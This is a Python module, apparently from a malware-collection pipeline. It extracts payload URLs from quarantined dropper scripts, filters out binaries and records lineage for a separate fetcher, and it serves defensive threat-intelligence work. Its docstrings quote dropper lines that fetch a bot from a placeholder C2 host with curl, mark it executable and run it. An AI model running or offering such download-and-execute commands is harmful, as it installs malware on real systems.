#!/usr/bin/env python3
"""Pull further retrieval URLs out of an artifact the fetcher already holds.

A stage-1 dropper is a shell script whose whole purpose is to name the real
payload once per CPU architecture:

    curl http://<C2>/arm  -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
    curl http://<C2>/arm5 -o WQZRTY; chmod 777 WQZRTY; ./WQZRTY telnet.curl

Before this module the fetcher stored that file and stopped. The artifact
actually worth having -- the bot -- was named in evidence we already held, on
disk, and never collected. C2 for this family stays up for days rather than
weeks, so "we will get to it" and "we will miss it" are the same sentence.

Nothing here fetches, resolves, decodes or executes anything. It reads bytes
that are already quarantined and returns records. Every network safety control
lives in fetcher.py, where a connection is actually made; keeping this module
inert is what lets it be tested without a socket and reasoned about without
reference to the egress model.
"""

import os
import re
from typing import Any, Dict, List, Optional

from shared import ioc

# Leading bytes that settle the question before any heuristic runs. ELF is the
# one that matters -- it is the prize, and it is the one thing we must never
# hand to a parser. The rest are here because a compressed or packed artifact
# is equally not a script, and treating one as text produces plausible-looking
# garbage URLs rather than an obvious failure.
BINARY_MAGIC = (
    b"\x7fELF",              # ELF: the bot
    b"MZ",                   # PE
    b"\x1f\x8b",             # gzip
    b"BZh",                  # bzip2
    b"\xfd7zXZ\x00",         # xz
    b"PK\x03\x04",           # zip
    b"\xca\xfe\xba\xbe",     # java class / fat mach-o
    b"\xcf\xfa\xed\xfe",     # mach-o 64
    b"\xce\xfa\xed\xfe",     # mach-o 32
    b"\x1bLua",              # precompiled lua, seen in a few router families
)

# How much of the head to judge by. A dropper declares itself in the first line;
# reading further to decide "is this text" only buys pathological cases.
SNIFF_BYTES = 8192

# Above this share of non-printable bytes in the sniffed head, it is not a
# script. Shell scripts are essentially all printable ASCII; the margin is for
# UTF-8 in a comment and the occasional stray control character.
MAX_NONPRINTABLE = 0.10

# Bounds on one body, so a 8MB text file cannot turn into thousands of records
# or pin the intel loop. Both are generous against a real dropper, which is a
# few dozen lines naming a dozen architectures.
MAX_LINES = 2000
MAX_URLS_PER_BODY = int(os.getenv("FETCH_MAX_URLS_PER_BODY", "32"))

_PRINTABLE = set(range(0x20, 0x7F)) | {0x09, 0x0A, 0x0D, 0x1B}

# Segments within a physical line. Splitting here rather than parsing the line
# whole is what stops ioc.extract()'s MAX_PER_COMMAND (12, sized for one
# command) truncating a dropper that crams every architecture onto one line.
# The regexes in ioc.py already stop at these characters, so segmenting changes
# nothing about what they match -- only how many times they are asked.
_SEGMENT_RE = re.compile(r"[;\n]|\|\||&&")


def is_text(body: bytes) -> bool:
    """Whether this artifact may be parsed for further URLs.

    Deliberately conservative in one direction only: a false "no" costs us one
    round of recursion into something that was probably a binary anyway, while
    a false "yes" means running regexes across executable code and recording
    whatever byte sequences happen to look like a hostname. One of those
    failures is quiet and produces confident nonsense, so this errs away from
    it.
    """
    if not body:
        return False
    head = bytes(body[:SNIFF_BYTES])
    if head.startswith(BINARY_MAGIC):
        return False
    # A NUL anywhere in the head settles it. No shell script contains one, and
    # every stripped binary does.
    if b"\x00" in head:
        return False
    nonprintable = sum(1 for byte in head if byte not in _PRINTABLE)
    return (nonprintable / len(head)) <= MAX_NONPRINTABLE


def canonical(entry: Dict[str, Any]) -> str:
    """The identity of a retrieval target, for de-duplication.

    Must match ioc._key()'s notion of the same URL or the fetcher would treat a
    target it has already recorded as new. Scheme, host, port and path -- not
    the raw text, which differs between `wget http://h/x` and `curl http://h/x`
    for the same file.
    """
    return (f"{str(entry.get('scheme') or '').lower()}://"
            f"{entry.get('host')}:{entry.get('port')}{entry.get('path') or '/'}")


def extract_from_body(body: bytes, *,
                      max_urls: int = MAX_URLS_PER_BODY) -> List[Dict[str, Any]]:
    """Retrieval targets named inside an already-captured artifact.

    Returns ioc.extract() records with a `source_line` added: the physical line
    the target was parsed from, kept whole rather than trimmed to the segment
    that matched. `curl http://c2/arm -o VFASXC; chmod 777 VFASXC; ./VFASXC`
    tells you the filename it was given and that it was made executable, and
    none of that survives if the record keeps only the segment holding the URL.

    Never raises. A body that cannot be decoded, parsed or understood yields no
    targets, which is the same outcome as a body that named none.
    """
    if not is_text(body):
        return []
    try:
        text = bytes(body).decode("utf-8", "replace")
    except Exception:                                           # noqa: BLE001
        return []

    found: List[Dict[str, Any]] = []
    seen = set()
    for line in text.splitlines()[:MAX_LINES]:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        for segment in _SEGMENT_RE.split(line):
            segment = segment.strip()
            if not segment:
                continue
            try:
                entries = ioc.extract(segment)
            except Exception:                                   # noqa: BLE001
                continue
            for entry in entries:
                key = canonical(entry)
                if key in seen:
                    continue
                seen.add(key)
                # The whole line, not the segment: see the docstring.
                entry["source_line"] = line[:300]
                found.append(entry)
                if len(found) >= max_urls:
                    return found
    return found


def lineage(*, parent_sha256: Optional[str], depth: int,
            source_line: str, method: str) -> Dict[str, Any]:
    """The provenance record attached to a derived artifact.

    Additive everywhere it is written -- no existing sidecar field changes
    meaning, and a reader that does not know about this key behaves exactly as
    it did before.
    """
    return {
        "parent_sha256": parent_sha256,
        "depth": int(depth),
        "source_line": str(source_line or "")[:300],
        "method": str(method or "")[:32],
    }
